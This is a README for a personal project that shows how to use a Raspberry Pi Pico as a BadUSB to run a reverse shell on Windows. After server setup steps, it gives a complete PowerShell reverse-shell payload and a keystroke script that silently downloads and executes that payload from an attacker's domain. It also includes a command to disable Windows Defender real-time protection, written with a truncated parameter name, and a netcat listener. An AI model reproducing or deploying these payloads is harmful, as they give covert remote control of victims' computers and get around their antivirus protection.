# ReverseShellWithRpiPico
This repository is a personal project aimed at explaining how to use a Raspberry Pi Pico as a BadUSB to execute a reverse shell attack on Windows.

For a reverse shell attack we need a victim client and an attacking server. The client will initiate a remote connection to the server that will accept it. So, it's the victim client that initiates a connection with the attaccking server, then the server becomes the master and the client becomes the slave.

In my case, I used a Raspberry Pi Pico to make the victim client connect to the attacking server.

## Server configuration
You need a web server, such as Aruba or Linode for example, but anything will do. In my case i used a Raspberry Pi 4 to host the web server. In case you want to use this solution, below you can find the guide for configuring the server on the following the server on rpi4 with Nginx (you can use apache or some other server). 

### Install Nginx
The first step is to install an OS (like Raspberry Pi OS or Kali linux ARM) on your Raspberry Pi 4. 
After the OS installation you need to open a new terminal window and type the following commands:

    sudo apt update
    sudo apt install nginx
### Install MySQL
In my case I used MariaDB. To install MariaDB paste the following command in the terminal:

    sudo apt install mariadb-server
Now we need to set up the root user. First thing, use the following command:

    sudo mysql_secure_installation
Follow the steps required to disable the default terminal access for the root user and to set a new root password.
### Install PHP
To install PHP you need just to type a couple of lines of command and guess what, you can find them below ;). 
    
    sudo apt-get install php-fpm php-mysql
    sudo nano /etc/php5/fpm/php.ini
With the last command you can edit the `php.ini` file. Find the line that says `cgi.fix_pathinfo=1` and change it to `cgi.fix_pathinfo=0`. Now, just restart PHP:

    sudo systemctl restart php-fpm
### Configure Nginx to use PHP
To configure Nginx to use PHP you can edit the following file:

    sudo nano /etc/nginx/sites-available/default
The file will look like this:

    server {
        listen 80 default_server;
        listen [::]:80 default_server;

        root /var/www/html;

        index index.php index.html index.htm index.nginx-debian.html;

        server_name [your public IP];

        location / {
            try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
            include snippets/fastcgi-php.conf;
            fastcgi_pass unix:/var/run/php5-fpm.sock;
        }

        location ~ /\.ht {
            deny all;
        }
    }
Replace `[your public IP]` with your public IP. 

Now, type these couple of lines to check the Nginx syntax and then restart the service:

    sudo nginx -t
    sudo systemctl reload nginx
### Set up port forwarding
You need to access your router's admin interface and find the port forwarding settings. Then set it like this:

    Service Port: 80
    Internal Port: 80
    IP Address: [your Pi's IP address]
    Protocol: TCP
    Common Service Port: HTTP
## BadUSB Setup
As mentioned previously, I used a Raspberry Pi Pico as a BadUSB. To do this you can follow this [link](https://github.com/dbisu/pico-ducky) tutorial.

## BadUSB script
Once the Raspberry Pi Pico is configured as BadUSB, we need to write the script that will allow us to establish the remote connection from the client to the attacking server. 
To achieve this I uploaded the file `payload.ps1`. 

    $sm=(New-Object Net.Sockets.TCPClient('your_domain',81)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
In this file you need to change "your_domain" to your real domain or IP address. Optionally, you can replace port 81 with another port.  

Now create a file named `payload.dd` and fill it with the following lines of code:

    DELAY 3000
    GUI r
    DELAY 1000
    STRING powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://your_domain/payload.ps1');"
    DELAY 1000
    ENTER
    DELAY 1000
    STRING exit
    DELAY 1000
Replace  "your_domain" with your effective domain, where you put the file `payload.ps1`. 
You need to turn off the Windows real time protection for this to work. You can do this by adding the following line of code to your script:

    powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
Now you need to set up the server to listen for any connection with a Netcat tool. Netcat is usually already installed in many Linux distros.

To make the server listen, you need to enter the line below in a terminal window:

    nc -lp 81
If you use another port in the `payload.ps1` file, you need to change the port in the above command. 

Now, we can connect the Raspberry Pi Pico to the client and we just need to wait a few seconds and check the connection on the server. 
